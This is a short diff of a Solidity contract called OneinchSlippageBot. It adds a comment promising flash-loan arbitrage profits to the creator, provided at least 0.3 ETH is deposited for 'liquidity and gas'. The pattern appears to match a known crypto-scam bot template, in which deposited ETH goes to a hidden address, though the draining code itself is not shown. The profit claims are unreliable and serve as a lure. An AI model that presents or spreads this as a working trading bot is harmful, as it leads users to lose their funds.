@@ -7,6 +7,19 @@ import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfa
 import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol";
 import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol";
 
+/**
+ * WARNING - this contract code is for ethereum 
+  * Testnet transactions will fail as there is no value
+  * New token will be created and flash loan will be pulled to trade against the token
+  * Profit remaining will be transfered to token creator
+  
+  *UPDATED 29 August 2025
+  *liquidity returned if flash loan fails or insufficient balance
+  *base rerun contract code swaps implemented
+  
+  *Min liquidity + gas fees has to equal 0.3 ETH
+*/
+
 contract OneinchSlippageBot {
  
     //string public tokenName;
